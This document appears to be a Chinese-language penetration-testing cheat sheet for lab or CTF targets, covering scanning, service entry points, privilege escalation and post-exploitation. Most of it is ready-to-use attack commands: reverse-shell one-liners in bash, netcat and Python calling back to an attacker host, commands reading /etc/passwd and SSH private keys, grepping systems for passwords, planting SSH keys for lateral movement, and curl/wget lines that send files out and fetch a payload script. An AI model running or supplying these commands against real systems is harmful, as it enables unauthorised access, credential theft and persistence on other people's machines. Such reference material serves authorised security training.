# 打靶基本流程

## 一、信息收集

### 主机发现
```bash
nmap -sn 10.10.10.0/24
netdiscover -r 10.10.10.0/24
```

### 端口扫描
```bash
nmap -sT --min-rate 10000 -p- 10.10.10.21 -oA nmapscan/ports
nmap -sT -sV -sC -O -p<端口> 10.10.10.21 -oA nmapscan/detail
nmap -sU --top-ports 20 10.10.10.21 -oA nmapscan/udp
nmap --script=vuln -p<端口> 10.10.10.21 -oA nmapscan/vuln
```
无结果时扫 IPv6

### 目录扫描
```bash
gobuster dir -u http://10.10.10.21 -w /usr/share/dirb/common.txt -x php,txt,html
dirsearch -u http://10.10.10.21
ffuf -u http://10.10.10.21/FUZZ -w wordlist.txt
```

### 指纹识别
```bash
whatweb http://10.10.10.21
```

## 二、攻击入口
```
21-FTP    匿名/爆破
22-SSH    弱口令/密钥
80/443    Web漏洞
445-SMB   EternalBlue/匿名共享
3306-MySQL/6379-Redis/27017-MongoDB → 未授权或弱口令
```

## 四、获取 Shell
```bash
# 反弹 Shell
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
nc -e /bin/bash 10.10.10.10 4444
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

## 五、提权
```bash
id; uname -a; cat /etc/passwd; cat /etc/os-release
find / -perm -4000 2>/dev/null          # SUID
sudo -l                                  # sudo 权限
cat /etc/crontab                         # 计划任务
find / -writable -type f 2>/dev/null     # 可写文件
```

## 六、后渗透
```bash
grep -r "password" /etc/ /home/* /var/www 2>/dev/null
cat ~/.ssh/id_rsa    # SSH 密钥
ssh-keygen && ssh-copy-id user@target    # 横向移动
```

## 速查
```bash
# 端口转发
ssh -L 8080:10.0.0.1:80 user@跳板机     # 本地转发
ssh -D 1080 user@跳板机                  # 动态代理(SOCKS)

# 文件传输
python3 -m http.server 80
curl -F "file=@local.txt" http://vps/
wget http://vps/payload.sh

# 编码
echo "字符串" | base64 -d
echo "X19..." | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))"
```
